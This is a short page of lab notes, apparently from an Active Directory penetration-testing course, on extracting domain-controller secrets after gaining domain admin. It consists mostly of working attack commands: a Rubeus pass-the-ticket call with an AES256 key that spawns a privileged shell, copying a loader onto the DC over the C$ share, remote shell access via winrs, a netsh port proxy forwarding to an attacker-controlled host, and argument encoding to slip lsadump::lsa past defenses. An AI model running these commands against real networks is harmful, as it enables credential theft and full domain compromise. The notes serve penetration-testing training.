# 🎟️ Extract secrets from DC, Create and use Golden Tickets

So after getting domain admin privileges, we will encode parameters as usual and run the rubeus command and ask for tgt and spawn a shell with domain admin privileges ->

<figure><img src="../../.gitbook/assets/image (1109).png" alt=""><figcaption><p>Running the rubeus command makes a shell spawn with DA privileges</p></figcaption></figure>

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Now we're going to copy Loader.exe on dcorp-dc:

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
#now let's hop on the dcorp-dc machine
winrs -r:dcorp-dc cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13
```

<figure><img src="../../.gitbook/assets/image (1111).png" alt=""><figcaption><p>Beware the path is dcorp-dc and not dcorpdc like in the manual</p></figcaption></figure>

Now we're going to use ArgSplit on the student VM to encode `lsadump::lsa`

<figure><img src="../../.gitbook/assets/image (1110).png" alt=""><figcaption></figcaption></figure>
